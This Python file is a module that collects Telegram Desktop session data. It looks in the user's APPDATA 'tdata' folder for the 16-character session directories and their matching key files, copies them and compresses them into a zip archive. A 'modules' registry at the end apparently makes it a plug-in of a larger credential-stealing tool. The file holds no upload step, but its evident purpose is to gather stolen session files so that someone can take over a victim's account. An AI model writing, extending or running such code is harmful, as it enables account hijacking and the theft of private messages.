# -*- coding: utf-8 -*-
import os, tempfile, shutil, zipfile


class Telegram:

    def __init__(self, paths):
        self.paths = paths if isinstance(paths, list) else [paths]

    def run(self, profile):
        founds = {}
        for x in self.paths:
            x = x.format(**profile)
            if os.path.isdir(x):
                temp = tempfile.mkdtemp()
                for i in os.listdir(x):
                    abs_src = os.path.abspath(os.path.join(x, i))
                    if os.path.isdir(abs_src) and len(i) == 16:
                        for ii in os.listdir(x):
                            if os.path.isfile(os.path.join(x, ii)) and ii.startswith(i) and len(ii) == 17:
                                shutil.copy(os.path.join(x, ii), temp)
                                shutil.copytree(abs_src, os.path.join(temp, i))
                                break
                src = temp
                dst = src + '.zip'
                with zipfile.ZipFile(dst, "w", zipfile.ZIP_LZMA) as zf:
                    for dirname, subdirs, files in os.walk(src):
                        for filename in files:
                            absname = os.path.abspath(os.path.join(dirname, filename))
                            zf.write(absname, absname[len(src) + 1:])
                founds[x] = dst
                shutil.rmtree(temp)

        return founds


modules = {"Telegram": Telegram('{APPDATA}\\Telegram Desktop\\tdata')}
